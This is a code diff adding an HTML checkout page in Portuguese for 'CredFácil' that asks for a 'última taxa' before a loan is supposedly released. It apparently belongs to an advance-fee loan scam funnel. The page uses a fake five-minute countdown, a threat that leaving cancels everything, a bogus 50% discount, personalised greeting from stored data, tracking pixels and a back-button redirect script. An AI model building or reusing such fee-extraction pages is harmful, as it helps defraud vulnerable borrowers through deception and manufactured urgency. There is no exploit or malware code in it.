@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+
+<meta charset="UTF-8">
+<!-- FurysMetrics - captura (dashboard CredFácil 3).
+     `_extid`: o MESMO id que o api/pix.js recebe e o webhook devolve - e por ele
+     que a venda casa com a visita. Criado AQUI porque o snippet e `defer` e o
+     JS do site pode rodar antes.
+     `window.fmEvento`: existe desde a primeira linha, entao evento disparado por
+     script SINCRONO (o ViewContent do /up1/) espera o snippet chegar em vez de
+     se perder em silencio. -->
+<script>(function(){try{if(!localStorage.getItem("_extid"))localStorage.setItem("_extid","u_"+Date.now().toString(36)+Math.random().toString(36).slice(2,12));}catch(e){}
+window.fmEvento=function(nome,eventId,valor){var x={pixel:false};if(eventId)x.event_id=eventId;if(valor!=null){x.valor=Number(valor)||0;x.moeda="BRL";}var n=0;(function t(){if(window.fm&&typeof fm.evento==="function"){try{fm.evento(nome,x);}catch(e){}return;}if(++n>50)return;setTimeout(t,200);})();};})();</script>
+<script id="__fm" src="https://fxmalxbvkuzlsyabuwoe.supabase.co/functions/v1/fm"
+        data-ws="016d0860cb0fd49e1a2504bdbbc8ba697fa5" data-uid-de="_extid" data-pixel="off" defer></script>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Última taxa · Liberação final · CredFácil</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<script src="../js/checkout-shared.js"></script>
+<script>
+  window.pixelId = "6a3acb84a0439721cfce74e3";
+  var a=document.createElement("script");a.async=1;a.defer=1;a.src="https://cdn.utmify.com.br/scripts/pixel/pixel.js";document.head.appendChild(a);
+</script>
+<!-- Bullster Pixel -->
+<script>
+  window.pixelToken = '600f0a9c-c1ff-4e2f-8b18-fa28a712f3cc';
+  (function (d, s) {
+    var js = d.createElement(s);
+    js.src = 'https://cdn.bullster.app/pixel.js';
+    js.async = true;
+    d.head.appendChild(js);
+  })(document, 'script');
+</script>
+<script src="https://cdn.utmify.com.br/scripts/utms/latest.js" async defer></script>
+<!-- Meta Pixel: removido do upsell/downsell (pixel só no front, 12/10) -->
+<style>
+  :root{--red:#dc2626;--red2:#7f1d1d;--green:#9f5f1a;}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:'Inter',sans-serif;background:#160606;color:#fff;min-height:100dvh;display:flex;align-items:center;justify-content:center;padding:22px 16px;overflow-x:hidden}
+  .wrap{width:100%;max-width:420px;text-align:center}
+  .siren{font-size:11px;letter-spacing:2px;text-transform:uppercase;font-weight:800;color:#fca5a5;margin-bottom:10px;display:flex;align-items:center;gap:8px;justify-content:center}
+  .siren i{width:9px;height:9px;border-radius:50%;background:var(--red);animation:bl .8s infinite}
+  @keyframes bl{50%{opacity:.2}}
+  .clock{font-size:46px;font-weight:900;font-variant-numeric:tabular-nums;color:#fff;background:linear-gradient(135deg,#dc2626,#7f1d1d);border-radius:18px;padding:14px 0;letter-spacing:2px;box-shadow:0 16px 40px -16px rgba(220,38,38,.8)}
+  .clab{font-size:12px;color:#fca5a5;margin-top:8px;font-weight:600}
+  h1{font-size:25px;font-weight:900;line-height:1.2;margin:20px 0 8px}
+  h1 b{color:#fca5a5}
+  .sub{font-size:14px;color:#e7c9c9;line-height:1.6;max-width:340px;margin:0 auto}
+  .lost{margin:18px 0;background:rgba(220,38,38,.12);border:1px solid rgba(220,38,38,.4);border-radius:14px;padding:14px 16px;font-size:13px;color:#fecaca;line-height:1.5}
+  .lost b{color:#fff}
+  .pricebox{background:#0c0303;border:1px solid #3a1414;border-radius:18px;padding:18px;margin-bottom:4px}
+  .pricebox .from{font-size:14px;color:#a88;text-decoration:line-through}
+  .pricebox .v{font-size:44px;font-weight:900;letter-spacing:-1px;color:#fff;line-height:1}
+  .pricebox .off{display:inline-block;margin-top:6px;background:#fda547;color:#7f1d1d;font-weight:800;font-size:12px;padding:4px 13px;border-radius:100px}
+  .btn{margin-top:16px;width:100%;border:none;cursor:pointer;background:linear-gradient(135deg,#9f5f1a,#3e342a);color:#fff;font-weight:900;font-size:17px;padding:18px;border-radius:15px;display:flex;align-items:center;justify-content:center;gap:9px;box-shadow:0 16px 34px -12px rgba(159,95,26,.6);animation:bp 1.7s infinite}
+  @keyframes bp{0%{box-shadow:0 0 0 0 rgba(159,95,26,.5)}70%{box-shadow:0 0 0 13px rgba(159,95,26,0)}100%{box-shadow:0 0 0 0 rgba(159,95,26,0)}}
+  .foot{margin-top:14px;font-size:11px;color:#9a7a7a}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="siren"><i></i> Última taxa antes da liberação</div>
+  <div class="clock" id="clk">04:59</div>
+  <div class="clab">Tempo para concluir antes do cancelamento</div>
+
+  <h1>É <b>agora ou nunca</b><span id="hi"></span></h1>
+  <p class="sub">Essa é a última taxa do processo. Reduzimos pela metade pra você não perder tudo que já avançou.</p>
+
+  <div class="lost">⚠️ Se você sair agora, <b>todo o processo é cancelado</b> e o valor que já estava reservado volta pra fila.</div>
+
+  <div class="pricebox">
+    <div class="from">de R$ 31,92</div>
+    <div class="v">R$ 15,96</div>
+    <div class="off">⚡ ÚLTIMA TAXA · 50% OFF</div>
+  </div>
+
+  <button class="btn" id="btn">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="#fff" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    Pagar última taxa e liberar agora
+  </button>
+  <div class="foot">CredFácil S.A. · CNPJ 15.484.329/0001-42</div>
+</div>
+<script>
+  (function(){
+    try{var n=(localStorage.getItem('nome')||'').trim();if(n)document.getElementById('hi').textContent=', '+n.split(' ')[0];}catch(e){}
+    document.getElementById('btn').addEventListener('click',function(){redirect('up12_ds');});
+    var el=document.getElementById('clk'),t=5*60-1;
+    var iv=setInterval(function(){t--;if(t<0){clearInterval(iv);el.textContent='00:00';return;}var m=String(Math.floor(t/60)).padStart(2,'0'),s=String(t%60).padStart(2,'0');el.textContent=m+':'+s;},1000);
+  })();
+</script>
+<script src="../js/back-redirect.js?v=4"></script>
+
+<script src="../js/upsells-shared.js"></script>
+
+</body>
+</html>
